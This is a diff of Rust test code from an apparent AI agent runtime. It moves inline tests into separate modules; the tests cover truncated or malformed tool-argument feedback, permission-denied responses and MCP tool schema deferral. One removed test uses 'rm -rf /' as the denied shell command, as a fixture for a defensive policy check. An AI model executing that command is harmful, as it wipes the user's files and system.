-            reason.contains("TRUNCATED") || reason.contains("cut off"),
-            "the carrier must be named as a truncated call: {reason}"
-        );
-        assert!(
-            reason.contains("shorter") || reason.contains("split") || reason.contains("smaller"),
-            "truncation feedback must coach a smaller re-issue: {reason}"
-        );
-        assert!(
-            !reason.contains("missing required parameter"),
-            "must NOT repeat the misdiagnosing missing-parameter message: {reason}"
-        );
-    }
-
-    #[test]
-    fn malformed_toolcall_carrier_stays_a_clean_parse_error() {
-        // A genuinely malformed (non-truncation) carrier must NOT be silently
-        // accepted or mislabeled as a truncation — it stays a clean parse error
-        // coaching valid JSON. Negative control against over-permissive repair.
-        let carrier = serde_json::json!({
-            "__parse_error": "Could not parse streamed tool arguments as JSON or Harn \
-                text-tool arguments: JSON error: key must be a string at line 1 column 5. \
-                Raw input: {path: not-json @#$}"
-        });
-        let (reason, cause) = arg_delivery_fault_feedback("edit", &carrier, None)
-            .expect("a malformed carrier is still a named parse fault");
-        assert_eq!(cause, "arguments_malformed");
-        assert!(
-            !reason.contains("TRUNCATED"),
-            "a non-EOF parse error must not be labeled a truncation: {reason}"
-        );
-        assert!(
-            reason.contains("JSON"),
-            "malformed feedback must coach valid JSON: {reason}"
-        );
-    }
-
-    #[test]
-    fn non_empty_args_keep_the_precise_validator_message() {
-        assert!(
-            arg_delivery_fault_feedback(
-                "edit",
-                &serde_json::json!({ "content": "x" }),
-                Some("length")
-            )
-            .is_none(),
-            "a call that DID deliver arguments must keep the missing-parameter message"
-        );
-    }
-
-    #[test]
-    fn permission_denied_keeps_do_not_retry_body() {
-        let envelope = agent_primitive_denied_tool(
-            "run",
-            "call_3",
-            &serde_json::json!({ "command": "rm -rf /" }),
-            "shell access is disabled by policy",
-            ToolCallErrorCategory::PermissionDenied,
-            None,
-            None,
-        );
-        assert_eq!(envelope["error_category"], "permission_denied");
-        let result = &envelope["result"];
-        assert_eq!(result["error"], serde_json::json!("permission_denied"));
-        let next = result["next_step"].as_str().expect("next_step");
-        assert!(
-            next.contains("Do not retry the same call"),
-            "true denial must still steer off a retry loop: {next}"
-        );
-    }
-}
-
-#[cfg(test)]
-mod mcp_bootstrap_tests {
-    use super::tag_mcp_tool;
-
-    fn sample_tools() -> Vec<serde_json::Value> {
-        vec![
-            serde_json::json!({
-                "name": "search_issues",
-                "description": "Search issues by query",
-                "inputSchema": {
-                    "type": "object",
-                    "properties": { "query": { "type": "string" } },
-                    "required": ["query"],
-                },
-            }),
-            serde_json::json!({
-                "name": "create_issue",
-                "description": "Create a new issue",
-                "inputSchema": {
-                    "type": "object",
-                    "properties": { "title": { "type": "string" } },
-                },
-            }),
-        ]
-    }
-
-    #[test]
-    fn catalog_defers_schemas_by_default() {
-        let tools: Vec<serde_json::Value> = sample_tools()
-            .into_iter()
-            .map(|tool| tag_mcp_tool(tool, "github", false))
-            .collect();
-        assert_eq!(tools.len(), 2);
-        for tool in &tools {
-            // Catalog surfaces name + one-line description...
-            assert!(tool.get("name").and_then(|v| v.as_str()).is_some());
-            assert!(tool.get("description").and_then(|v| v.as_str()).is_some());
-            // ...and defers the full input schema until tool_search /
-            // dispatch reaches for it.
-            assert_eq!(
-                tool.get("defer_loading").and_then(|v| v.as_bool()),
-                Some(true),
-                "MCP tools should defer their schema by default"
-            );
-        }
-        // Names are server-namespaced so cross-server collisions can't
-        // happen, and the MCP executor wiring is preserved so the tool
-        // stays callable once its schema is loaded on demand.
-        let first = &tools[0];
-        assert_eq!(
-            first.get("name").and_then(|v| v.as_str()),
-            Some("github__search_issues")
-        );
-        assert_eq!(
-            first.get("executor").and_then(|v| v.as_str()),
-            Some("mcp_server")
-        );
-        assert_eq!(
-            first.get("mcp_server").and_then(|v| v.as_str()),
-            Some("github")
-        );
-        assert_eq!(
-            first.get("_mcp_server").and_then(|v| v.as_str()),
-            Some("github")
-        );
-        assert_eq!(
-            first.get("_mcp_tool_name").and_then(|v| v.as_str()),
-            Some("search_issues")
-        );
-        // The full schema is still carried on the descriptor (it is held
-        // back at the provider/agent-loop layer, not discarded), so it
-        // resolves on demand when the tool is surfaced or called.
-        assert!(first
-            .get("inputSchema")
-            .and_then(|v| v.as_object())
-            .is_some());
-    }
-
-    #[test]
-    fn eager_opt_out_ships_schemas_upfront() {
-        let tools: Vec<serde_json::Value> = sample_tools()
-            .into_iter()
-            .map(|tool| tag_mcp_tool(tool, "github", true))
-            .collect();
-        for tool in &tools {
-            assert!(
-                tool.get("defer_loading").is_none(),
-                "eager_schemas: true must not defer MCP tool schemas"
-            );
-            assert!(tool
-                .get("inputSchema")
-                .and_then(|v| v.as_object())
-                .is_some());
-        }
-    }
-
-    #[test]
-    fn server_advertised_defer_loading_is_preserved() {
-        // A server that explicitly sets defer_loading: false keeps it,
-        // even under the progressive-disclosure default.
-        let tool = serde_json::json!({
-            "name": "ping",
-            "description": "Health check",
-            "defer_loading": false,
-        });
-        let tagged = tag_mcp_tool(tool, "ops", false);
-        assert_eq!(
-            tagged.get("defer_loading").and_then(|v| v.as_bool()),
-            Some(false)
-        );
-    }
-}
-
-#[cfg(test)]
-mod parse_tool_call_id_tests;
-
-#[cfg(test)]
 mod approval_unavailable_tests;
 #[cfg(test)]
+mod auto_review_decider_tests;
+#[cfg(test)]
+mod denied_tool_routing_tests;
+#[cfg(test)]
+mod mcp_bootstrap_tests;
+#[cfg(test)]
+mod parse_tool_call_id_tests;
+#[cfg(test)]
 mod schema_argument_dispatch_tests;
+#[cfg(test)]
+mod security_gate_tests;
 #[cfg(test)]
 mod session_scope_tests;
 #[cfg(test)]
 mod side_effect_ceiling_tests;
+#[cfg(test)]
+mod tool_failure_recording_tests;
 #[cfg(test)]
 mod tool_output_truncation_tests;
